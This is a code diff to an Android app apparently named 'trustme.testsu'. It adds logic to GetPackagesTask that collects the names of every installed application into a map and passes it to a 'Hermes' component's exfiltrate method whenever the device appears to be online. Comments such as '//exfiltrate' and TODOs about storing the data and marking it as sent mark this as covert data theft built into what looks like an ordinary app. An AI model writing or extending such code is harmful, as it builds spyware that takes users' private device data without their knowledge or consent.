@@ -4,6 +4,8 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 
+import com.trustme.testsu.utils.Constants;
+
 import android.content.pm.PackageInfo;
 import android.os.AsyncTask;
 import android.util.Log;
@@ -17,6 +19,9 @@ import android.util.Log;
  *
  */
 public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
+	Hermes hermes = new Hermes();
+	WiFiTracker wifiTracker = new WiFiTracker();
+	
 	protected GetPackagesTask() { }
 	
 	@Override
@@ -39,9 +44,23 @@ public class GetPackagesTask extends AsyncTask<Void, Void, Void>{
 		
 		ArrayList<PInfo> packagesList = getPackages();
 		HashMap<String, String> map = new HashMap<String, String>();
-		//for ((PInfo) pack )
+		
+		for (PInfo pack : packagesList){
+			map.put(pack.pname, pack.appname);
+		}
 		
 		//exfiltrate
+		if (wifiTracker.read_arp()){
+			//TODO: Store the Data into the DB
+			hermes.exfiltrate(map, Constants.PACKAGES_TRANSACTION);
+			//TODO: mark the data in the DB as sent
+		}
+		else{
+			//no internet
+			//TODO: start the IP tracking service
+			//store the data into DB
+			
+		}
 	}
 	
 	/**
